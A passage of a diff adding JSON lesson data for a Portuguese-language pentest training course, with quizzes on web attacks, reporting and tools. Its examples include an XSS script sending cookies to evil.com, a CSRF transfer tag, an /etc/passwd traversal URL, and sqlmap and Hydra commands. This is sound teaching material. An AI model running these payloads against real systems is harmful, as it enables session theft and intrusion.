+        "content": "<b>Broken Access Control</b> ocorre quando usuários acessam recursos ou funções que <b>não deveriam</b>. Ex: usuário comum acessando painel admin, ou vendo dados de outros usuários.",
+        "highlight": "#1 do OWASP Top 10 em 2021"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-arrows-up-down",
+        "title": "IDOR",
+        "content": "<b>IDOR</b> (Insecure Direct Object Reference): o atacante modifica um ID na URL (ex: /user/123 → /user/124) para acessar dados de outro usuário.",
+        "highlight": "Trocar um número na URL pode vazar dados"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "IDOR em Ação",
+        "scenario": "A URL <b>/api/invoice/1001</b> mostra sua fatura. O atacante muda para <b>/api/invoice/1002</b> e vê a fatura de outro cliente com dados pessoais e financeiros.",
+        "takeaway": "Sempre verifique autorização no servidor, não apenas no cliente."
+      },
+      {
+        "type": "quiz",
+        "task": "O que é IDOR?",
+        "options": [
+          "Acessar dados de outros usuários alterando IDs na requisição",
+          "Um tipo de malware que rouba dados",
+          "Um protocolo de criptografia web"
+        ],
+        "correctText": "Acessar dados de outros usuários alterando IDs na requisição",
+        "explanation": "IDOR = referência direta a objeto sem verificação de autorização."
+      },
+      {
+        "type": "fill",
+        "sentence": "Alterar /user/123 para /user/124 na URL para ver dados de outro usuário é um ataque de ___.",
+        "options": [
+          "IDOR",
+          "XSS",
+          "CSRF"
+        ],
+        "correctText": "IDOR",
+        "explanation": "IDOR = Insecure Direct Object Reference, exploração de falta de controle de acesso."
+      }
+    ]
+  },
+  {
+    "filename": "6.7-xss.html",
+    "module": "6",
+    "title": "Cross-Site Scripting 6.7",
+    "victory_msg": "XSS DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-code",
+        "title": "O que é XSS?",
+        "content": "<b>Cross-Site Scripting (XSS)</b> injeta código JavaScript malicioso em páginas web. Quando outro usuário acessa a página, o script executa no browser da <b>vítima</b>.",
+        "highlight": "XSS = injetar JS que roda no browser da vítima"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-layer-group",
+        "title": "Tipos de XSS",
+        "content": "<b>Reflected</b>: payload na URL, executa quando a vítima clica. <b>Stored</b>: payload salvo no banco, executa para todos que acessam. <b>DOM-based</b>: manipula o DOM no client-side.",
+        "highlight": "Stored XSS é o mais perigoso (afeta todos)"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Roubo de Cookie via XSS",
+        "scenario": "O atacante injeta em um comentário: o script envia o cookie de sessão de todo usuário que ler o comentário para o servidor do atacante.",
+        "code": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
+        "takeaway": "XSS Stored permite roubar sessões de todos os visitantes da página."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual tipo de XSS salva o payload no banco de dados e afeta todos os visitantes?",
+        "options": [
+          "Stored XSS",
+          "Reflected XSS",
+          "DOM-based XSS"
+        ],
+        "correctText": "Stored XSS",
+        "explanation": "Stored XSS é persistente — o payload fica salvo e executa para cada visitante."
+      },
+      {
+        "type": "fill",
+        "sentence": "A defesa principal contra XSS é aplicar ___ em toda saída de dados para o HTML.",
+        "options": [
+          "encoding/escaping",
+          "compressão",
+          "criptografia"
+        ],
+        "correctText": "encoding/escaping",
+        "explanation": "Output encoding converte caracteres especiais (<, >, &) em entidades HTML inofensivas."
+      }
+    ]
+  },
+  {
+    "filename": "6.8-csrf-ssrf.html",
+    "module": "6",
+    "title": "CSRF e SSRF 6.8",
+    "victory_msg": "CSRF E SSRF DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-arrows-rotate",
+        "title": "CSRF",
+        "content": "<b>CSRF</b> (Cross-Site Request Forgery) faz o browser da vítima enviar uma requisição autenticada a um site onde ela está logada. A vítima executa ações <b>sem perceber</b>.",
+        "highlight": "O browser da vítima ataca por ela"
+      },
+      {
+        "type": "example",
+        "icon": "fa-envelope",
+        "title": "Transferência Forçada",
+        "scenario": "O atacante envia um e-mail com uma imagem invisível: <b>&lt;img src='https://banco.com/transferir?para=atacante&valor=1000'&gt;</b>. Se a vítima estiver logada no banco, a transferência é feita.",
+        "takeaway": "CSRF explora a confiança do servidor no browser autenticado."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-server",
+        "title": "SSRF",
+        "content": "<b>SSRF</b> (Server-Side Request Forgery) faz o <b>servidor</b> fazer requisições para recursos internos. O atacante acessa serviços que não estão expostos à internet.",
+        "highlight": "SSRF = o servidor faz a requisição por você"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ataque faz o browser da vítima enviar requisições autenticadas sem ela saber?",
+        "options": [
+          "CSRF",
+          "SSRF",
+          "XSS"
+        ],
+        "correctText": "CSRF",
+        "explanation": "CSRF explora o cookie de sessão já presente no browser da vítima."
+      },
+      {
+        "type": "match",
+        "title": "CSRF vs SSRF",
+        "pairs": [
+          {
+            "term": "CSRF",
+            "definition": "Browser da vítima faz a requisição"
+          },
+          {
+            "term": "SSRF",
+            "definition": "Servidor do alvo faz a requisição"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "A defesa contra CSRF é usar ___ em formulários para validar a origem da requisição.",
+        "options": [
+          "tokens anti-CSRF",
+          "firewall",
+          "criptografia"
+        ],
+        "correctText": "tokens anti-CSRF",
+        "explanation": "Tokens anti-CSRF são valores únicos que o atacante não consegue prever."
+      }
+    ]
+  },
+  {
+    "filename": "6.9-clickjacking.html",
+    "module": "6",
+    "title": "Clickjacking 6.9",
+    "victory_msg": "CLICKJACKING DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-computer-mouse",
+        "title": "O que é Clickjacking?",
+        "content": "<b>Clickjacking</b> esconde uma página dentro de um iframe transparente. A vítima pensa que está clicando em um botão inofensivo, mas está clicando em algo escondido (ex: curtir, transferir).",
+        "highlight": "Clique invisível em ação escondida"
+      },
+      {
+        "type": "example",
+        "icon": "fa-layer-group",
+        "title": "Like Hijacking",
+        "scenario": "O atacante cria uma página com um jogo. Sob o botão 'Jogar' há um iframe invisível do Facebook com o botão 'Curtir'. Cada clique no jogo gera uma curtida na página do atacante.",
+        "takeaway": "iframes transparentes podem roubar cliques."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual header HTTP previne que uma página seja carregada dentro de um iframe?",
+        "options": [
+          "X-Frame-Options",
+          "Content-Type",
+          "Cache-Control"
+        ],
+        "correctText": "X-Frame-Options",
+        "explanation": "X-Frame-Options: DENY impede que a página seja embutida em iframes de outros sites."
+      },
+      {
+        "type": "fill",
+        "sentence": "Clickjacking usa um ___ transparente para capturar cliques em ações escondidas.",
+        "options": [
+          "iframe",
+          "cookie",
+          "token"
+        ],
+        "correctText": "iframe",
+        "explanation": "O iframe invisível sobrepõe a página real, redirecionando cliques da vítima."
+      }
+    ]
+  },
+  {
+    "filename": "6.10-configuracao.html",
+    "module": "6",
+    "title": "Configuração de Segurança 6.10",
+    "victory_msg": "HARDENING WEB DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-gear",
+        "title": "Security Misconfiguration",
+        "content": "Configurações padrão inseguras: <b>senhas default</b> (admin/admin), <b>listagem de diretórios</b> habilitada, <b>headers de segurança</b> ausentes, <b>debug mode</b> em produção.",
+        "highlight": "Configuração padrão = insegura por padrão"
+      },
+      {
+        "type": "example",
+        "icon": "fa-folder-open",
+        "title": "Listagem de Diretórios",
+        "scenario": "O servidor Apache com <b>Options +Indexes</b> permite listar todos os arquivos de um diretório. O atacante navega por pastas e encontra backups do banco de dados (<b>backup.sql</b>).",
+        "takeaway": "Sempre desabilite listagem de diretórios em produção."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual é um exemplo clássico de Security Misconfiguration?",
+        "options": [
+          "Senhas default não alteradas (admin/admin)",
+          "Uso de HTTPS com certificado válido",
+          "Autenticação por MFA"
+        ],
+        "correctText": "Senhas default não alteradas (admin/admin)",
+        "explanation": "Senhas padrão são a primeira coisa que um atacante testa."
+      },
+      {
+        "type": "fill",
+        "sentence": "Deixar o modo ___ ativado em produção expõe stack traces e informações sensíveis.",
+        "options": [
+          "debug",
+          "seguro",
+          "offline"
+        ],
+        "correctText": "debug",
+        "explanation": "Debug mode revela erros detalhados, caminhos de arquivo e configurações internas."
+      }
+    ]
+  },
+  {
+    "filename": "6.11-inclusao-arquivos.html",
+    "module": "6",
+    "title": "Inclusão de Arquivos 6.11",
+    "victory_msg": "FILE INCLUSION DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-file-import",
+        "title": "LFI e RFI",
+        "content": "<b>LFI</b> (Local File Inclusion): o atacante inclui arquivos locais do servidor (ex: /etc/passwd). <b>RFI</b> (Remote File Inclusion): inclui arquivos de um servidor externo.",
+        "highlight": "Incluir arquivos não previstos = acesso total"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "LFI para Ler /etc/passwd",
+        "scenario": "A URL <b>page.php?file=about.html</b> é vulnerável. O atacante muda para <b>page.php?file=../../../etc/passwd</b> e lê a lista de usuários do sistema.",
+        "code": "page.php?file=../../../etc/passwd",
+        "takeaway": "Path traversal (../) permite navegar pelo sistema de arquivos do servidor."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ataque permite ler arquivos locais do servidor através de path traversal?",
+        "options": [
+          "LFI (Local File Inclusion)",
+          "XSS",
+          "CSRF"
+        ],
+        "correctText": "LFI (Local File Inclusion)",
+        "explanation": "LFI usa ../ para navegar pelo filesystem e ler arquivos sensíveis."
+      },
+      {
+        "type": "fill",
+        "sentence": "A técnica de usar ../ para navegar pelo sistema de arquivos é chamada de ___.",
+        "options": [
+          "Path Traversal",
+          "SQL Injection",
+          "Buffer Overflow"
+        ],
+        "correctText": "Path Traversal",
+        "explanation": "Path Traversal (Directory Traversal) usa ../ para sair do diretório permitido."
+      }
+    ]
+  },
+  {
+    "filename": "7.0-introducao.html",
+    "module": "7",
+    "title": "Cloud e IoT 7.0",
+    "victory_msg": "CLOUD/IOT INICIADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-cloud",
+        "title": "Ataques em Cloud e IoT",
+        "content": "Este módulo cobre ataques a <b>ambientes cloud</b> (AWS, Azure, GCP), <b>dispositivos IoT</b>, <b>sistemas de armazenamento</b>, <b>VMs</b> e <b>containers</b>.",
+        "highlight": "Cloud e IoT são a nova superfície de ataque"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-server",
+        "title": "Responsabilidade Compartilhada",
+        "content": "Na cloud, a segurança é <b>compartilhada</b>: o provedor protege a infraestrutura, o cliente protege os dados e configurações. Misconfiguration é o risco nº1.",
+        "highlight": "Cloud segura exige configuração correta do cliente"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual é o risco nº1 em ambientes cloud?",
+        "options": [
+          "Misconfiguration (configuração incorreta)",
+          "Hardware defeituoso",
+          "Falta de internet"
+        ],
+        "correctText": "Misconfiguration (configuração incorreta)",
+        "explanation": "A maioria dos incidentes em cloud são causados por configurações incorretas do cliente."
+      },
+      {
+        "type": "fill",
+        "sentence": "No modelo de ___, o provedor cloud e o cliente dividem responsabilidades de segurança.",
+        "options": [
+          "responsabilidade compartilhada",
+          "licença aberta",
+          "código aberto"
+        ],
+        "correctText": "responsabilidade compartilhada",
+        "explanation": "Shared Responsibility Model define quem protege o quê na cloud."
+      }
+    ]
+  },
+  {
+    "filename": "8.0-introducao.html",
+    "module": "8",
+    "title": "Pós-Exploração 8.0",
+    "victory_msg": "PÓS-EXPLORAÇÃO INICIADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-door-open",
+        "title": "Pós-Exploração",
+        "content": "Após comprometer um sistema, o atacante precisa <b>manter acesso</b> (persistência), <b>mover-se lateralmente</b> pela rede e <b>evitar detecção</b>.",
+        "highlight": "Entrar é só o começo"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-unlock",
+        "title": "Escalação de Privilégios",
+        "content": "<b>Privilege Escalation</b>: passar de usuário comum para <b>root/admin</b>. Pode ser <b>vertical</b> (user→admin) ou <b>horizontal</b> (user→outro user).",
+        "highlight": "Sem privilégios = acesso limitado"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual tipo de escalação de privilégios passa de usuário comum para administrador?",
+        "options": [
+          "Vertical",
+          "Horizontal",
+          "Lateral"
+        ],
+        "correctText": "Vertical",
+        "explanation": "Vertical = subir de nível (user→admin). Horizontal = mesmo nível, outra conta."
+      },
+      {
+        "type": "fill",
+        "sentence": "A escalação ___ de privilégios ocorre quando um usuário comum obtém acesso de root/admin.",
+        "options": [
+          "vertical",
+          "horizontal",
+          "diagonal"
+        ],
+        "correctText": "vertical",
+        "explanation": "Vertical = subir de nível de permissão no mesmo sistema."
+      }
+    ]
+  },
+  {
+    "filename": "9.0-introducao.html",
+    "module": "9",
+    "title": "Relatórios 9.0",
+    "victory_msg": "RELATÓRIOS INICIADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-file-alt",
+        "title": "A Importância do Relatório",
+        "content": "O relatório é o <b>produto final</b> do pentest. Um relatório mal escrito invalida todo o trabalho técnico. Deve ser claro para <b>executivos</b> e detalhado para <b>técnicos</b>.",
+        "highlight": "Relatório ruim = pentest inútil"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-users",
+        "title": "Dois Públicos",
+        "content": "O relatório tem duas seções: <b>Executive Summary</b> (para gestão, sem jargão técnico) e <b>Technical Details</b> (para equipe técnica, com evidências e reprodução).",
+        "highlight": "Fale a língua do seu público"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual é o produto final mais importante de um pentest?",
+        "options": [
+          "O relatório escrito",
+          "As ferramentas usadas",
+          "O número de vulnerabilidades"
+        ],
+        "correctText": "O relatório escrito",
+        "explanation": "Sem relatório claro, o cliente não consegue corrigir as vulnerabilidades."
+      },
+      {
+        "type": "fill",
+        "sentence": "O relatório deve ter um ___ para executivos e detalhes técnicos para a equipe de TI.",
+        "options": [
+          "Executive Summary",
+          "código-fonte",
+          "payload"
+        ],
+        "correctText": "Executive Summary",
+        "explanation": "Executive Summary traduz achados técnicos em riscos de negócio."
+      }
+    ]
+  },
+  {
+    "filename": "9.1-componentes-relatorio.html",
+    "module": "9",
+    "title": "Componentes do Relatório 9.1",
+    "victory_msg": "ESTRUTURA DO RELATÓRIO DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-list",
+        "title": "Estrutura do Relatório",
+        "content": "Componentes essenciais: <b>Escopo</b>, <b>Metodologia</b>, <b>Executive Summary</b>, <b>Achados</b> (com CVSS), <b>Evidências</b> (screenshots), <b>Recomendações</b> e <b>Anexos</b>.",
+        "highlight": "Estrutura padronizada garante completude"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-camera",
+        "title": "Evidências",
+        "content": "Cada vulnerabilidade deve ter <b>evidência reproduzível</b>: screenshots, logs, requests/responses do Burp, e passos exatos para reproduzir. Sem evidência = achado descartável.",
+        "highlight": "Evidência concreta é incontestável"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-chart-pie",
+        "title": "Classificação de Risco",
+        "content": "Cada achado recebe uma classificação: <b>Crítico</b>, <b>Alto</b>, <b>Médio</b>, <b>Baixo</b>, <b>Informativo</b>. Baseada no <b>CVSS</b> e no <b>contexto de negócio</b> do cliente.",
+        "highlight": "Contexto de negócio afeta a classificação"
+      },
+      {
+        "type": "match",
+        "title": "Seção → Conteúdo",
+        "pairs": [
+          {
+            "term": "Executive Summary",
+            "definition": "Visão geral para gestão"
+          },
+          {
+            "term": "Achados",
+            "definition": "Vulnerabilidades com CVSS e evidências"
+          },
+          {
+            "term": "Recomendações",
+            "definition": "Como corrigir cada vulnerabilidade"
+          },
+          {
+            "term": "Metodologia",
+            "definition": "Frameworks e ferramentas usadas"
+          }
+        ]
+      },
+      {
+        "type": "quiz",
+        "task": "O que torna uma evidência de vulnerabilidade válida no relatório?",
+        "options": [
+          "Screenshots e passos reproduzíveis",
+          "Apenas a opinião do pentester",
+          "O nome da ferramenta que detectou"
+        ],
+        "correctText": "Screenshots e passos reproduzíveis",
+        "explanation": "Evidência deve permitir que outro profissional reproduza o achado."
+      },
+      {
+        "type": "fill",
+        "sentence": "Cada vulnerabilidade deve incluir uma pontuação ___ para indicar sua gravidade.",
+        "options": [
+          "CVSS",
+          "DNS",
+          "TCP"
+        ],
+        "correctText": "CVSS",
+        "explanation": "CVSS padroniza a gravidade das vulnerabilidades de 0 a 10."
+      }
+    ]
+  },
+  {
+    "filename": "9.2-analise-recomendacoes.html",
+    "module": "9",
+    "title": "Análise e Recomendações 9.2",
+    "victory_msg": "RECOMENDAÇÕES FORMULADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-wrench",
+        "title": "Recomendações de Correção",
+        "content": "Cada achado deve ter uma <b>recomendação específica</b>: não apenas 'corrigir SQLi', mas sim 'implementar Prepared Statements na query X do arquivo Y, linha Z'.",
+        "highlight": "Recomendações vagas são inúteis"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-sort-amount-up",
+        "title": "Priorização",
+        "content": "Priorize correções por: <b>CVSS</b> (gravidade), <b>exposição</b> (internet vs interna), <b>facilidade de exploração</b> e <b>impacto no negócio</b>.",
+        "highlight": "Corrija o mais perigoso primeiro"
+      },
+      {
+        "type": "example",
+        "icon": "fa-list-ol",
+        "title": "Priorizando Achados",
+        "scenario": "SQLi no login público (CVSS 9.8, internet) > XSS no painel admin interno (CVSS 6.1, intranet) > Versão de jQuery desatualizada (CVSS 3.1, informativo).",
+        "takeaway": "Exposição e impacto pesam tanto quanto o CVSS."
+      },
+      {
+        "type": "quiz",
+        "task": "Como deve ser uma boa recomendação de correção?",
+        "options": [
+          "Específica: arquivo, linha e correção exata",
+          "Genérica: 'melhore a segurança'",
+          "Apenas o link do CVE"
+        ],
+        "correctText": "Específica: arquivo, linha e correção exata",
+        "explanation": "Recomendações específicas permitem que a equipe técnica corrija rapidamente."
+      },
+      {
+        "type": "fill",
+        "sentence": "A priorização deve considerar CVSS, exposição e ___ no negócio.",
+        "options": [
+          "impacto",
+          "cor",
+          "tamanho"
+        ],
+        "correctText": "impacto",
+        "explanation": "Impacto no negócio determina a urgência real da correção."
+      }
+    ]
+  },
+  {
+    "filename": "9.3-comunicacao-escalonamento.html",
+    "module": "9",
+    "title": "Comunicação 9.3",
+    "victory_msg": "COMUNICAÇÃO PROFISSIONAL DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-bullhorn",
+        "title": "Comunicação Durante o Teste",
+        "content": "O pentester deve manter <b>comunicação constante</b> com o ponto de contato. Achados <b>críticos</b> devem ser reportados <b>imediatamente</b>, não esperar o relatório final.",
+        "highlight": "Achado crítico = reporte imediato"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-triangle-exclamation",
+        "title": "Escalonamento",
+        "content": "Se durante o teste o pentester encontrar <b>evidência de invasão real</b> (não simulada), deve <b>parar</b> e <b>escalar</b> imediatamente para a equipe de resposta a incidentes.",
+        "highlight": "Invasão real ≠ teste. Pare e escale."
+      },
+      {
+        "type": "quiz",
+        "task": "O que fazer ao encontrar evidência de invasão real durante um pentest?",
+        "options": [
+          "Parar e escalar para resposta a incidentes",
+          "Continuar o teste normalmente",
+          "Tentar remover o invasor por conta própria"
+        ],
+        "correctText": "Parar e escalar para resposta a incidentes",
+        "explanation": "Evidência de comprometimento real exige resposta a incidentes, não continuação do teste."
+      },
+      {
+        "type": "fill",
+        "sentence": "Achados de severidade ___ devem ser reportados imediatamente, sem esperar o relatório final.",
+        "options": [
+          "crítica",
+          "baixa",
+          "informativa"
+        ],
+        "correctText": "crítica",
+        "explanation": "Vulnerabilidades críticas representam risco iminente e exigem ação imediata."
+      }
+    ]
+  },
+  {
+    "filename": "9.4-atividades-pos-entrega.html",
+    "module": "9",
+    "title": "Pós-Entrega 9.4",
+    "victory_msg": "PÓS-ENTREGA CONCLUÍDA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-broom",
+        "title": "Limpeza Pós-Teste",
+        "content": "Após o teste, o pentester deve <b>remover</b> todos os artefatos: <b>web shells</b>, <b>contas criadas</b>, <b>backdoors</b>, <b>arquivos temporários</b>. Deixar restos é irresponsável.",
+        "highlight": "Limpe tudo que você criou durante o teste"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-handshake",
+        "title": "Debriefing",
+        "content": "O <b>debriefing</b> é a reunião pós-entrega onde o pentester apresenta os achados, responde dúvidas e ajuda a equipe técnica a entender as recomendações.",
+        "highlight": "Debriefing garante que as correções serão feitas"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-rotate-right",
+        "title": "Retest",
+        "content": "Após o cliente corrigir as vulnerabilidades, o pentester realiza um <b>retest</b> para verificar se as correções foram eficazes e não introduziram novos problemas.",
+        "highlight": "Retest confirma que as correções funcionaram"
+      },
+      {
+        "type": "quiz",
+        "task": "O que o pentester deve fazer com web shells e backdoors após o teste?",
+        "options": [
+          "Remover todos completamente",
+          "Deixar para futuras referências",
+          "Compartilhar com colegas"
+        ],
+        "correctText": "Remover todos completamente",
+        "explanation": "Artefatos deixados no sistema são uma vulnerabilidade real que poderia ser explorada."
+      },
+      {
+        "type": "match",
+        "title": "Atividade → Momento",
+        "pairs": [
+          {
+            "term": "Limpeza de artefatos",
+            "definition": "Imediatamente após o teste"
+          },
+          {
+            "term": "Debriefing",
+            "definition": "Após entrega do relatório"
+          },
+          {
+            "term": "Retest",
+            "definition": "Após o cliente corrigir os achados"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "A reunião onde o pentester apresenta os achados ao cliente é chamada de ___.",
+        "options": [
+          "debriefing",
+          "kickoff",
+          "standup"
+        ],
+        "correctText": "debriefing",
+        "explanation": "Debriefing é a sessão final de apresentação e discussão dos resultados."
+      }
+    ]
+  },
+  {
+    "filename": "10.0-introducao.html",
+    "module": "10",
+    "title": "Ferramentas 10.0",
+    "victory_msg": "FERRAMENTAS INICIADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-toolbox",
+        "title": "Ferramentas e Scripts",
+        "content": "Este módulo final cobre <b>scripting</b> (Bash, Python, PowerShell), <b>automação de testes</b> e <b>análise de código de exploits</b>. Saber programar diferencia um pentester profissional.",
+        "highlight": "Script = automação = eficiência"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-code",
+        "title": "Linguagens Essenciais",
+        "content": "<b>Python</b>: a linguagem nº1 para pentest (scripts, exploits, automação). <b>Bash</b>: automação em Linux. <b>PowerShell</b>: automação em Windows/AD. <b>SQL</b>: exploração de bancos.",
+        "highlight": "Python + Bash + PowerShell = arsenal completo"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual linguagem é mais usada para automação de tarefas de pentest?",
+        "options": [
+          "Python",
+          "Java",
+          "C#"
+        ],
+        "correctText": "Python",
+        "explanation": "Python é a linguagem preferida por sua simplicidade e rica biblioteca de segurança."
+      },
+      {
+        "type": "fill",
+        "sentence": "Para automação em ambientes Windows e Active Directory, a linguagem mais usada é ___.",
+        "options": [
+          "PowerShell",
+          "Bash",
+          "Ruby"
+        ],
+        "correctText": "PowerShell",
+        "explanation": "PowerShell é nativo do Windows e tem acesso direto ao Active Directory."
+      }
+    ]
+  },
+  {
+    "filename": "10.2a-recon-enum-tools.html",
+    "module": "10",
+    "title": "Ferramentas de Recon e Enumeração 10.2a",
+    "victory_msg": "FERRAMENTAS DE RECON DOMINADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-binoculars",
+        "title": "10.2.1 Visão Geral",
+        "content": "As ferramentas de pentest são organizadas por <b>fase do ataque</b>: reconhecimento, varredura, exploração, pós-exploração, evasão, forense e relatório.",
+        "highlight": "Cada fase tem suas ferramentas especializadas"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-linux",
+        "title": "10.2.2 Distribuições Linux",
+        "content": "<b>Kali Linux</b>: a distro mais popular, 600+ ferramentas. <b>Parrot OS</b>: alternativa leve com foco em privacidade. <b>BlackArch</b>: rolling release com 2800+ ferramentas.",
+        "highlight": "Kali = padrão, Parrot = leve, BlackArch = completo"
+      },
+      {
+        "type": "match",
+        "title": "Distro → Característica",
+        "pairs": [
+          {
+            "term": "Kali Linux",
+            "definition": "600+ ferramentas, padrão da indústria"
+          },
+          {
+            "term": "Parrot OS",
+            "definition": "Leve, foco em privacidade"
+          },
+          {
+            "term": "BlackArch",
+            "definition": "2800+ ferramentas, rolling release"
+          }
+        ]
+      },
+      {
+        "type": "teach",
+        "icon": "fa-magnifying-glass",
+        "title": "10.2.3 Ferramentas de Reconhecimento",
+        "content": "<b>Nmap</b>: scanner de rede. <b>Recon-ng</b>: framework OSINT modular. <b>theHarvester</b>: e-mails e subdomínios. <b>Maltego</b>: visualização de relações. <b>Shodan</b>: busca de dispositivos. <b>Censys</b>: certificados TLS.",
+        "highlight": "Cada ferramenta cobre um aspecto do recon"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-folder-tree",
+        "title": "Enumeração com Enum4linux",
+        "content": "<b>Enum4linux</b> enumera informações de hosts Windows/Samba: <b>shares</b>, <b>usuários</b>, <b>grupos</b>, <b>políticas de senha</b> e <b>SIDs</b>. Usa protocolos SMB e RPC.",
+        "highlight": "Enum4linux = raio-X de servidores Windows/Samba"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Enum4linux em Ação",
+        "scenario": "O pentester roda enum4linux contra um servidor Windows e descobre shares abertos, lista de usuários e política de senhas fraca.",
+        "code": "enum4linux -a 192.168.1.100",
+        "takeaway": "-a = modo agressivo, enumera tudo que conseguir."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-sitemap",
+        "title": "DNSRecon e Subfinder",
+        "content": "<b>DNSRecon</b>: enumeração DNS completa (zone transfer, brute force de subdomínios). <b>Subfinder</b>: descoberta passiva de subdomínios via APIs públicas.",
+        "highlight": "Subdomínios esquecidos são portas de entrada"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta enumera shares, usuários e grupos de servidores Windows via SMB?",
+        "options": [
+          "Enum4linux",
+          "Nmap",
+          "Wireshark"
+        ],
+        "correctText": "Enum4linux",
+        "explanation": "Enum4linux usa SMB/RPC para extrair informações detalhadas de hosts Windows."
+      },
+      {
+        "type": "fill",
+        "sentence": "A ferramenta ___ descobre subdomínios passivamente usando APIs de fontes públicas.",
+        "options": [
+          "Subfinder",
+          "Nmap",
+          "Metasploit"
+        ],
+        "correctText": "Subfinder",
+        "explanation": "Subfinder consulta fontes como VirusTotal, Shodan e Censys para encontrar subdomínios."
+      }
+    ]
+  },
+  {
+    "filename": "10.2b-vuln-cred-tools.html",
+    "module": "10",
+    "title": "Ferramentas de Vuln e Credencial 10.2b",
+    "victory_msg": "FERRAMENTAS DE ATAQUE DOMINADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-bug",
+        "title": "10.2.5 Ferramentas de Varredura de Vuln",
+        "content": "<b>Nessus</b>: scanner comercial líder. <b>OpenVAS</b>: alternativa open source. <b>Nikto</b>: scanner web específico. <b>WPScan</b>: scanner para WordPress. <b>SQLMap</b>: automação de SQL Injection.",
+        "highlight": "Cada scanner é especializado em um domínio"
+      },
+      {
+        "type": "match",
+        "title": "Scanner → Alvo",
+        "pairs": [
+          {
+            "term": "Nessus",
+            "definition": "Varredura geral de vulnerabilidades"
+          },
+          {
+            "term": "Nikto",
+            "definition": "Servidores web"
+          },
+          {
+            "term": "WPScan",
+            "definition": "Sites WordPress"
+          },
+          {
+            "term": "SQLMap",
+            "definition": "SQL Injection automatizado"
+          }
+        ]
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "SQLMap Automatizado",
+        "scenario": "O pentester encontra um parâmetro vulnerável a SQLi e usa SQLMap para automatizar a extração do banco de dados completo.",
+        "code": "sqlmap -u 'http://alvo.com/page?id=1' --dbs --batch",
+        "takeaway": "SQLMap automatiza toda a cadeia de exploração SQLi."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-key",
+        "title": "10.2.7 Ferramentas de Ataque de Credencial",
+        "content": "<b>Hydra</b>: brute force online (SSH, FTP, HTTP). <b>John the Ripper</b>: cracking offline de hashes. <b>Hashcat</b>: cracking com GPU. <b>Medusa</b>: brute force paralelo. <b>CeWL</b>: gera wordlists a partir de sites.",
+        "highlight": "Online = Hydra. Offline = Hashcat/John."
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Hydra Brute Force SSH",
+        "scenario": "O pentester usa Hydra com uma wordlist para testar senhas SSH contra um servidor alvo.",
+        "code": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
+        "takeaway": "Hydra testa milhares de senhas por minuto contra serviços de rede."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-microchip",
+        "title": "Hashcat com GPU",
+        "content": "<b>Hashcat</b> usa a GPU para cracking massivamente paralelo. Suporta 300+ tipos de hash (MD5, SHA, NTLM, bcrypt). <b>Modo 0</b>: dicionário. <b>Modo 3</b>: brute force. <b>Modo 6</b>: híbrido.",
+        "highlight": "GPU cracka milhões de hashes por segundo"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta usa a GPU para cracking massivamente paralelo de hashes?",
+        "options": [
+          "Hashcat",
+          "Hydra",
+          "Nmap"
+        ],
+        "correctText": "Hashcat",
+        "explanation": "Hashcat aproveita o poder paralelo da GPU para testar bilhões de combinações."
+      },
+      {
+        "type": "fill",
+        "sentence": "A ferramenta ___ gera wordlists customizadas a partir do conteúdo de um website.",
+        "options": [
+          "CeWL",
+          "Hydra",
+          "Nmap"
+        ],
+        "correctText": "CeWL",
